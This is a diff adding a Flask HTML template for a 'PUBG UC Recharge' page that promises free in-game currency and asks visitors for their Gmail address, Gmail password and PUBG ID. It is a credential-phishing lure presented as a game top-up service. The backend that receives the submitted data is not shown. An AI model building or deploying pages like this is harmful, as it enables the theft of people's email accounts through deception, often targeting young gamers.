@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG UC Recharge</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<div class="container">
+    <h1>PUBG UC Recharge</h1>
+    <p>Get your PUBG UC instantly by entering your details.</p>
+
+    {% with messages = get_flashed_messages(with_categories=true) %}
+        {% if messages %}
+            {% for category, message in messages %}
+                <div class="alert {{ category }}">{{ message }}</div>
+            {% endfor %}
+        {% endif %}
+    {% endwith %}
+
+    <form method="POST">
+        <label for="email">Gmail Address:</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="password">Gmail Password:</label>
+        <input type="password" id="password" name="password" required>
+
+        <label for="pubg_id">PUBG ID:</label>
+        <input type="text" id="pubg_id" name="pubg_id" required>
+
+        <button type="submit">Recharge Now</button>
+    </form>
+</div>
+
+</body>
+</html>
